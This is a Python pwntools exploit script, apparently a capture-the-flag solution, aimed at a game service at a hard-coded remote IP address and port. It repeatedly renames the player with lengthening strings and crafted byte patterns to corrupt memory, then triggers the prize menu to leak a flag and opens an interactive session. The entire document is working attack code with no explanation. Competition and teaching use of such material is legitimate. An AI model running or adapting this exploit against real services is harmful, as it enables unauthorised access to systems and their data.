#!/usr/bin/python3

from pwn import *

r = remote("54.169.181.206", 10001)

def play():
   r.sendlineafter("choice: ", '1')
   r.sendlineafter("a letter: ", "aaaa")
   r.sendlineafter("Your score: 100", "")

def rename(name):
   r.sendlineafter("choice: ", '5')
   r.sendlineafter("new name: ", name)

def prize():
   r.sendlineafter("choice: ", '4')
   # r.recvuntil("Flag: ")
   print (r.recv())

r.sendlineafter("Enter your name: ", 'A'*21)
for i in range(22, 288):
   rename('C'*i)


for i in range(19):
   rename('C'*288 + '\xff'*(i+1))

for i in range(19):
   rename('c'*(308-(i+1)))

aa = 18*2
rename("\xff\xff\xff\xff\xff\x60\x31\x60"[::-1]*aa)
aa -= 1
for i in range(16*2):
   for j in range(5):
       rename("\xff\xff\xff\xff\xff\x60\x31\x60"[::-1]*aa + "\x60\x31\x60" + "a"*(4-j))
   aa-=1
rename("aaaa")
play()
prize()
r.interactive()
